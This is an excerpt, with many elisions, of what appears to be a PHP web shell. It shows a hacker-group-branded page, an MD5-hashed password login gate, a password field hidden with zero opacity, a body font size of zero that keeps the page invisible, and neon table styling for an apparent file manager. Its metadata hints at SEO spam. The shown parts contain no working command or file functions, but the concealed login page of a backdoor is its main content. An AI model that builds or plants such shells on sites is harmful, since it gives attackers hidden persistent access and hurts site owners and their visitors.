...
// ---- KONFIGURASI ----
$stored_md5 = 'd4f35352653e1ec0bb23bf8eed843a19'; // MD5 dari "Pemburu Janda Pirang Squad"

// ---- PROSES LOGIN ----
if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    if (md5($entered_password) === $stored_md5) {
...
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    ...
    <head>
        ...
        <style>
            ...
            /* Password disembunyikan sebelum fokus */
            #password {
                opacity: 0;
...
<head>
    ...
    <meta property="og:title" content="Pemburu Janda Pirang Squad">
    <meta property="og:description" content="fahx7nonexec seo 303">
    <meta name="theme-color" content="#00ff80ff">
    <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
    <title>Pemburu Janda Pirang Squad</title>
...
@import url('https://fonts.googleapis.com/css2?family=Lora:ital,wght@0,400..700;1,400..700&family=Rock+Salt&family=Squada+One&display=swap');
body {
    color: black;
    font-size: 0px;
    font-family: 'Lora';
...
.border {
    box-shadow: 0px 0px 10px #00ff80ff;
    border: 2px solid #00ff80ff!important;
    border-radius: 5px;
...
.table td {
    padding: 0.1rem;
    box-shadow: inset 0px 0px 0px 1px #00ff80ff;
    border-radius: 2px;
}

.table thead th {
    font-family: 'Lora', cursive;
    box-shadow: inset 0px 0px 0px 1.5px #00ff80ff;
    color: #00ff80ff;
    padding: 0.25rem;
    border-radius: 5px;
...
@keyframes rainbowBorder {
            0% {
                border-image: linear-gradient(to right, #00ff80ff, magenta) 1;
            }
            14% {
            ...
            85% {
                border-image: linear-gradient(to right, pink, #00ff80ff) 1;
            }
            100% {
                border-image: linear-gradient(to right, #00ff80ff, magenta) 1;
            }
...
<a href="?" style="font-size: 2.5rem;padding: 1.5rem;"><span class="rainbow-text" style="font-family:Squada One">Pemburu Janda Pirang Squad</span></a> 
</div>
